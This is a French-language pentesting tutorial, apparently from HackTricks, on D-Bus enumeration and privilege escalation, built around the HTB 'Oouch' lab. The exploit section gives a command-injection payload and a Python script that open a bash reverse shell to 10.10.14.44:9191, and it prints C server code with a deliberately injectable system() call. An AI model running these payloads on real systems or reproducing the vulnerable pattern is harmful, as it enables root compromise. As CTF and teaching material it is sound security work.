# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **Énumération via GUI**

D-Bus est utilisé comme médiateur des communications inter-processus (IPC) dans les environnements de bureau Ubuntu. Sur Ubuntu, plusieurs message buses fonctionnent simultanément : le system bus, principalement utilisé par les **services privilégiés pour exposer des services pertinents à l’échelle du système**, ainsi qu’un session bus pour chaque utilisateur connecté, exposant des services pertinents uniquement pour cet utilisateur. L’accent est principalement mis ici sur le system bus en raison de son association avec des services exécutés avec des privilèges élevés (par exemple, root), notre objectif étant d’effectuer une Privilege Escalation. Il convient de noter que l’architecture de D-Bus utilise un « routeur » par session bus, chargé de rediriger les messages des clients vers les services appropriés, en fonction de l’adresse indiquée par les clients pour le service avec lequel ils souhaitent communiquer.

Les services sur D-Bus sont définis par les **objets** et les **interfaces** qu’ils exposent. Les objets peuvent être comparés à des instances de classes dans les langages OOP classiques, chaque instance étant identifiée de manière unique par un **object path**. Ce chemin, comparable à un chemin de système de fichiers, identifie de manière unique chaque objet exposé par le service. Une interface essentielle pour la recherche est l’interface **org.freedesktop.DBus.Introspectable**, qui comprend une seule méthode, Introspect. Cette méthode renvoie une représentation XML des méthodes, signaux et propriétés pris en charge par l’objet ; l’accent est ici mis sur les méthodes, tandis que les propriétés et les signaux sont omis.

Pour communiquer avec l’interface D-Bus, deux outils ont été utilisés : un outil CLI nommé **gdbus**, permettant d’appeler facilement les méthodes exposées par D-Bus dans des scripts, et [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un outil GUI basé sur Python conçu pour énumérer les services disponibles sur chaque bus et afficher les objets contenus dans chaque service.
```bash
sudo apt-get install d-feet
```
Si vous vérifiez le **session bus**, confirmez d’abord l’adresse actuelle :
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Sur la première image, les services enregistrés auprès du bus système D-Bus sont affichés, avec **org.debin.apt** spécifiquement mis en évidence après avoir sélectionné le bouton System Bus. D-Feet interroge ce service pour obtenir les objets, et affiche les interfaces, méthodes, propriétés et signaux des objets sélectionnés, comme on peut le voir sur la deuxième image. La signature de chaque méthode est également détaillée.

Une fonctionnalité notable est l'affichage de l'**identifiant du processus (pid)** et de la **ligne de commande** du service, ce qui permet de vérifier si le service s'exécute avec des privilèges élevés, un élément important pour la pertinence de la recherche.

**D-Feet permet également d'invoquer des méthodes** : les utilisateurs peuvent saisir des expressions Python comme paramètres, que D-Feet convertit en types D-Bus avant de les transmettre au service.

Cependant, notez que **certaines méthodes nécessitent une authentification** avant de nous autoriser à les invoquer. Nous ignorerons ces méthodes, puisque notre objectif est précisément d'élever nos privilèges sans identifiants.

Notez également que certains services interrogent un autre service D-Bus nommé org.freedeskto.PolicyKit1 afin de déterminer si un utilisateur doit être autorisé ou non à effectuer certaines actions.

## **Énumération de la ligne de commande**

### Lister les objets des services

Il est possible de lister les interfaces D-Bus ouvertes avec :
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Les services marqués **`(activatable)`** sont particulièrement intéressants, car ils **ne sont pas encore en cours d’exécution**, mais une requête du bus peut les démarrer à la demande. Ne vous arrêtez pas à `busctl list` ; associez ces noms aux binaires qu’ils exécuteraient réellement.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Cela vous indique rapidement quel chemin `Exec=` sera lancé pour un nom activatable et sous quelle identité. Si le binaire ou sa chaîne d'exécution est mal protégée, un service inactif peut tout de même devenir un vecteur d'élévation de privilèges.

#### Connexions

[Depuis Wikipedia :](https://en.wikipedia.org/wiki/D-Bus) Lorsqu'un processus établit une connexion à un bus, le bus attribue à cette connexion un nom de bus spécial appelé _nom de connexion unique_. Les noms de bus de ce type sont immuables — il est garanti qu'ils ne changeront pas tant que la connexion existe — et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu'aucune autre connexion à ce bus ne se verra jamais attribuer un nom de connexion unique identique, même si le même processus ferme sa connexion au bus puis en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables, car ils commencent par le caractère deux-points, interdit par ailleurs.

### Informations sur l'objet du service

Ensuite, vous pouvez obtenir des informations sur l'interface avec :
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Corrélez également le nom du bus avec son unité `systemd` et le chemin de l’exécutable :
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Cela répond à la question opérationnelle qui compte lors d'une privesc : **si un appel de méthode réussit, quel binaire réel et quelle unité effectueront l'action ?**

### Lister les interfaces d'un objet de service

Vous devez disposer de permissions suffisantes.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspection de l'interface d'un objet de service

Notez que, dans cet exemple, la dernière interface découverte a été sélectionnée à l'aide du paramètre `tree` (_voir la section précédente_) :
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Notez la méthode `.Block` de l’interface `htb.oouch.Block` (celle qui nous intéresse). Le « s » des autres colonnes peut signifier qu’elle attend une chaîne de caractères.

Avant d’essayer quoi que ce soit de dangereux, validez d’abord une méthode **read-oriented** ou présentant un risque limité. Cela permet de distinguer clairement trois cas : syntaxe incorrecte, méthode accessible mais refusée, ou méthode accessible et autorisée.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Corréler les méthodes D-Bus avec les policies et les actions

L’introspection vous indique **ce que** vous pouvez appeler, mais elle ne vous indique pas **pourquoi** un appel est autorisé ou refusé. Pour un triage de privesc réel, vous devez généralement examiner **trois couches simultanément** :

1. **Les métadonnées d’activation** (fichiers `.service` ou `SystemdService=`) pour déterminer quel binaire et quelle unité seront réellement exécutés.
2. **La policy XML de D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) pour déterminer qui peut `own`, `send_destination` ou `receive_sender`.
3. **Les fichiers d’action Polkit** (`/usr/share/polkit-1/actions/*.policy`) pour déterminer le modèle d’autorisation par défaut (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Commandes utiles :
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
N'assumez pas de correspondance 1:1 entre une méthode D-Bus et une action Polkit. La même méthode peut choisir une action différente selon l'objet modifié ou le contexte d'exécution. Le workflow pratique est donc :

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` et grep des fichiers `.policy` pertinents
3. sondes live à faible risque avec `busctl call`, `gdbus call` ou `dbusmap --enable-probes --null-agent`

Les services proxy ou de compatibilité méritent une attention particulière. Un **proxy s'exécutant en tant que root** qui transmet des requêtes à un autre service D-Bus via sa propre connexion préétablie peut accidentellement amener le backend à traiter chaque requête comme provenant de l'UID 0, à moins que l'identité de l'appelant d'origine ne soit revalidée.

### Interface de monitor/capture

Avec suffisamment de privilèges (les privilèges `send_destination` et `receive_sender` seuls ne suffisent pas), vous pouvez **monitorer une communication D-Bus**.

Pour **monitorer** une **communication**, vous devez être **root**. Si vous rencontrez toujours des problèmes en étant root, consultez [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) et [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si vous savez comment configurer un fichier de configuration D-Bus pour **autoriser les utilisateurs non root à sniffer** la communication, veuillez **me contacter** !

Différentes façons de monitorer :
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Dans l’exemple suivant, l’interface `htb.oouch.Block` est surveillée et **le message "**_**lalalalal**_**" est envoyé par mauvaise communication** :
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Vous pouvez utiliser `capture` à la place de `monitor` pour enregistrer les résultats dans un fichier **pcapng** que Wireshark peut ouvrir :
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrer tout le bruit <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

S’il y a tout simplement trop d’informations sur le bus, transmettez une règle de correspondance comme suit :
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Plusieurs règles peuvent être spécifiées. Si un message correspond à _l'une_ des règles, il sera affiché. Comme ceci :
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consultez la [documentation D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) pour plus d’informations sur la syntaxe des match rules.

### Plus

`busctl` propose encore plus d’options, [**retrouvez-les toutes ici**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scénario vulnérable**

En tant qu’utilisateur **qtc à l’intérieur de l’hôte « oouch » de HTB**, vous pouvez trouver un **fichier de configuration D-Bus inattendu** situé dans _/etc/dbus-1/system.d/htb.oouch.Block.conf_ :
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Notez dans la configuration précédente que **vous devrez être l’utilisateur `root` ou `www-data` pour envoyer et recevoir des informations** via cette communication D-BUS.

En tant qu’utilisateur **qtc** à l’intérieur du conteneur Docker `aeb4525789d8`, vous pouvez trouver du code lié à dbus dans le fichier _/code/oouch/routes.py._ Voici le code intéressant :
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Comme vous pouvez le voir, il **se connecte à une interface D-Bus** et envoie le « client_ip » à la fonction **« Block »**.

De l'autre côté de la connexion D-Bus, un binaire compilé en C est exécuté. Ce code **écoute** sur la connexion D-Bus **une adresse IP et appelle iptables via la fonction `system`** afin de bloquer l'adresse IP fournie.\
L'appel à `system` est volontairement vulnérable à l'injection de commandes**, de sorte qu'un payload comme le suivant créera un reverse shell : `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

À la fin de cette page, vous trouverez le **code C complet de l'application D-Bus**. Vous trouverez notamment, entre les lignes 91 et 97, **la manière dont le `D-Bus object path`** **et le `interface name`** sont **enregistrés**. Ces informations seront nécessaires pour envoyer des données à la connexion D-Bus :
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
De plus, à la ligne 57, vous pouvez constater que **la seule méthode enregistrée** pour cette communication D-Bus s'appelle `Block`(_**C'est pourquoi, dans la section suivante, les payloads seront envoyés à l'objet de service `htb.oouch.Block`, à l'interface `/htb/oouch/Block` et au nom de méthode `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Le code Python suivant enverra le payload à la connexion D-Bus via la méthode `Block`, au moyen de `block_iface.Block(runme)` (_notez qu’il a été extrait du précédent extrait de code_) :
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl et dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` est un outil utilisé pour envoyer des messages au « Message Bus ».
- Message Bus – Un logiciel utilisé par les systèmes pour faciliter les communications entre les applications. Il est lié à Message Queue (les messages sont ordonnés dans une séquence), mais dans Message Bus, les messages sont envoyés selon un modèle d’abonnement et sont également très rapides.
- Le tag « -system » est utilisé pour indiquer qu’il s’agit d’un message système, et non d’un message de session (par défaut).
- Le tag « --print-reply » est utilisé pour afficher correctement notre message et recevoir les éventuelles réponses dans un format lisible par l’utilisateur.
- « --dest=Dbus-Interface-Block » L’adresse de l’interface Dbus.
- « --string: » – Le type de message que nous voulons envoyer à l’interface. Il existe plusieurs formats pour envoyer des messages, comme double, bytes, booleans, int et objpath. Parmi ceux-ci, « object path » est utile lorsque nous voulons envoyer le chemin d’un fichier à l’interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) dans ce cas pour transmettre une commande à l’interface sous la forme d’un nom de fichier. « string:; » – Cela permet d’appeler à nouveau l’object path, à l’emplacement où nous plaçons le fichier/la commande de reverse shell FIFO.

_Notez que dans `htb.oouch.Block.Block`, la première partie (`htb.oouch.Block`) fait référence à l’objet du service, tandis que la dernière partie (`.Block`) fait référence au nom de la méthode._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Helpers d’enumeration automatisée (2023-2025)

L’enumeration manuelle d’une large attack surface D-Bus avec `busctl`/`gdbus` devient rapidement pénible. Deux petits utilitaires FOSS publiés ces dernières années peuvent accélérer les opérations lors d’engagements de red-team ou de CTF :

### dbusmap ("Nmap for D-Bus")
* Auteur : @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Écrit en C ; binaire statique unique (<50 kB) qui parcourt chaque object path, récupère le XML `Introspect` et l’associe au PID/UID propriétaire.
* Flags utiles :
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* L’outil marque les well-known names non protégés avec `!`, révélant instantanément les services que vous pouvez *own* (prendre le contrôle) ou les appels de méthodes accessibles depuis un shell non privilégié.

### uptux.py
* Auteur : @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Script uniquement en Python qui recherche les paths *writable* dans les unités systemd ainsi que les fichiers de policy D-Bus trop permissifs (par ex. `send_destination="*"`).
* Utilisation rapide :
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Le module D-Bus recherche dans les répertoires ci-dessous et met en évidence tout service pouvant être spoofé ou hijacké par un utilisateur normal :
* `/etc/dbus-1/system.d/` et `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bugs notables d’élévation de privilèges D-Bus (2024-2025)

Surveiller les CVE récemment publiées aide à repérer des patterns similaires dans du code custom. Deux bons exemples récents sont :

| Année | CVE | Composant | Cause principale | Leçon offensive |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Le service exécuté en root exposait une interface D-Bus que les utilisateurs non privilégiés pouvaient reconfigurer, notamment en chargeant un comportement de macro contrôlé par l’attaquant. | Si un daemon expose la **gestion de périphériques/profils/configuration** sur le system bus, considérez la configuration writable et les fonctionnalités de macro comme des primitives d’exécution de code, et pas seulement comme des « paramètres ». |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un proxy de compatibilité exécuté en root transmettait les requêtes aux services backend sans préserver le security context du caller d’origine ; les backends faisaient donc confiance au proxy en tant qu’UID 0. | Considérez les services D-Bus de type **proxy / bridge / compatibilité** comme une classe de bugs distincte : s’ils relaient des appels privilégiés, vérifiez comment l’UID du caller et le contexte Polkit atteignent le backend. |

Patterns à remarquer :
1. Le service s’exécute **en root sur le system bus**.
2. Soit il n’y a **aucun contrôle d’autorisation**, soit le contrôle est effectué sur le **mauvais sujet**.
3. La méthode accessible finit par modifier l’état du système : installation de packages, modification d’utilisateurs/groupes, configuration du bootloader, mise à jour de profils de périphériques, écritures de fichiers ou exécution directe de commandes.

Utilisez `dbusmap --enable-probes` ou un appel `busctl call` manuel pour confirmer qu’une méthode est accessible, puis examinez le XML de policy du service et les actions Polkit afin de comprendre **quel sujet** est réellement autorisé.

---

## Gains rapides de hardening et de détection

* Recherchez les policies world-writable ou ouvertes à l’envoi/réception :
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Exigez Polkit pour les méthodes dangereuses – même les proxies *root* devraient transmettre le PID du *caller* à `polkit_authority_check_authorization_sync()` plutôt que le leur.
* Réduisez les privilèges des helpers de longue durée (utilisez `sd_pid_get_owner_uid()` pour changer de namespace après la connexion au bus).
* Si vous ne pouvez pas supprimer un service, limitez-le au minimum à un groupe Unix dédié et restreignez l’accès dans sa policy XML.
* Blue-team : capturez le system bus avec `busctl capture > /var/log/dbus_$(date +%F).pcapng` et importez-le dans Wireshark pour détecter les anomalies.

---

## Références

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
